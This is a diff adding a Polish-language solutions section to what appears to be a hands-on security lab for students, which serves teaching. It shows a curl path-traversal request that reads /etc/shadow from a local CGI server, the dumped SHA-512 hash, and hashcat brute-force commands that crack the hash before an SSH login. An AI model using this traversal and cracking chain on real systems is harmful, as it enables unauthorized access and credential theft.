@@ -108,3 +108,85 @@ agh:x:1000:1000:,,,:/home/agh:/bin/bash
 
 Serwer ma wystawiony również protokół SSH, twoim zadaniem jest zalogowanie się na użytkownika agh przez protokół ssh `ssh agh@localhost`. Wykorzystaj plik `etc/shadow` aby wyciągnąć hasło użytkownika agh.
 
+
+# Rozwiązania
+## Zadanie 1
+<details>
+<summary>Rozwązanie</summary>
+<br>
+
+Wysyłamy zapytanie z formularza logowania do użytkownika `admin` za pomocą **Burpa** a nastepnie odczytujemy hash hasła z odpowiedzi uzyskanej od serwera.
+
+Uzyskanie hasło próbujemy złamać przy pomocy hashcata
+
+uruchamiamy hashcata
+
+```
+hashcat -m 1800 -a3 password ?u?u?u?u
+```
+
+Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).
+
+password to plik w którym przechowujemy hash, który będzie przez nas łamany.
+
+Jeśli chodzi o ciąg znaków "?u?u?u?u", to jest to szablon, który określa, jakie hasło będzie szukane [link](https://hashcat.net/wiki/doku.php?id=mask_attack).
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+Czyli hashcat dla argunetu "?u?u?u?u" wygeneruje wszytskie 4 znakowe możliwości liter "ABCDEFGHIJKLMNOPQRSTUVWXYZ".
+
+Po złamaniu hasła logujemy się na serwer
+
+</details>
+
+
+## Zadanie 2
+<details>
+
+<summary>Wskazówki</summary>
+<br>
+W pliku server.js
+w endpoincie /login zahaszuj hasło którym użytkownik próbuje się zalogować (skorzystaj z wzoru w kodzie klienta), następnie porównaj je z haszem wyciąganym z bazy. Do klienta w response wyślij status: 200 OK lub 401 Unauthorized w zależności od tego czy dane logowania się zgadzają. Zrób to za pomocą res.sendStatus(code)
+</details>
+
+## Zadanie 3
+<details>
+<summary>Rozwązanie</summary>
+
+```console
+ curl http://localhost:8090/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow
+```
+
+wynik:
+
+```console
+...
+agh:$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1:19364:0:99999:7:::
+```
+
+zapisujemy hash w pliku
+
+```
+echo '$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1' > password
+```
+
+uruchamiamy hashcata
+
+```
+hashcat -m 1800 -a3 password ?u?u?u
+```
+
+Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).
+
+password to plik w którym przechowujemy hash, który będzie przez nas łamany
+
+Jeśli chodzi o ciąg znaków "?u?u?u", to jest to szablon, który określa, jakie hasło będzie szukane [link](https://hashcat.net/wiki/doku.php?id=mask_attack).
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+Po złamaniu hasła logujemy sie na serwer
+
+```
+ssh agh@localhost
+```
+
+</details>
+
